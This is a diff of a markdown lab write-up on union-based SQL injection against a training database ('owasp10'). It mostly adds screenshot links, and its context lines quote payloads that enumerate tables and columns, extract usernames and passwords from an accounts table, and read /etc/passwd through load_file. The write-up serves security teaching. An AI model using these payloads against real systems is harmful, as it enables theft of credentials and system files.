@@ -179,12 +179,14 @@ As given in the screenshot below columns 2,3,4 are usable in which we can substi
 
 ![Alt text](img/10.png)
 
+<img width="811" height="104" alt="{F6DC1EA4-D7F3-40C9-831E-8DFEF1055CD0}" src="https://github.com/user-attachments/assets/ad5325f8-ef8a-4914-82ef-72f99402b03a" />
 
 
 
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 ##  OUTPUT
-
+![Alt text](img/10.png)
+<img width="1625" height="289" alt="{BA67EC4A-F0ED-4E89-91A6-C3A9C504C53F}" src="https://github.com/user-attachments/assets/b8da79a1-a4fa-487f-aa66-d639a5522ecc" />
 
 
 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
@@ -193,7 +195,11 @@ In MySQL, the table “information_schema.tables” contains all the metadata id
 Replace the query in the url with the following one:
 union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 ##  OUTPUT
+<img width="815" height="327" alt="image" src="https://github.com/user-attachments/assets/4f12bc71-d756-48e0-b8df-cc6d48e5c8a4" />
 
+
+![Alt text](img/10.png)
+<img width="917" height="233" alt="{D87C9058-74B9-40A9-B4D6-15B8FFF60FFB}" src="https://github.com/user-attachments/assets/d7d58d7f-ecf7-4a06-9614-c2ff0c88efbc" />
 
 
 
@@ -208,8 +214,10 @@ Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns wher
 
 Here we are trying to extract column names from the “accounts” table.
 ##  OUTPUT
+<img width="818" height="251" alt="{2B5217CF-F998-468A-8946-C88F91FBCD47}" src="https://github.com/user-attachments/assets/56d4e274-df11-4683-a432-f6c550f6f896" />
 
-
+![Alt text](img/10.png)
+<img width="929" height="254" alt="{0237D909-2F7C-4E81-AEA2-B9E2AEA2D62B}" src="https://github.com/user-attachments/assets/4f174f29-6d7b-44d7-843d-ddb7a270ddef" />
 
 The column names of the accounts is displayed below for the following url:
 
@@ -218,6 +226,8 @@ Once we discovered all available column names, we can extract information from t
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
 ##  OUTPUT
+![Alt text](img/10.png)
+<img width="1633" height="388" alt="{C87EBB43-E375-4097-9B57-56009D06BB59}" src="https://github.com/user-attachments/assets/a54f48fe-1612-4d69-91e3-d17f15627618" />
 
 
 
@@ -228,6 +238,8 @@ Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
 
 ##  OUTPUT
+![Alt text](img/10.png)
+<img width="1629" height="301" alt="{69C7F7B2-5554-4DED-A99D-5D0B8E8E6767}" src="https://github.com/user-attachments/assets/bb7ba56e-708e-465a-8e86-6dff17ace99d" />
 
 
 ## RESULT:
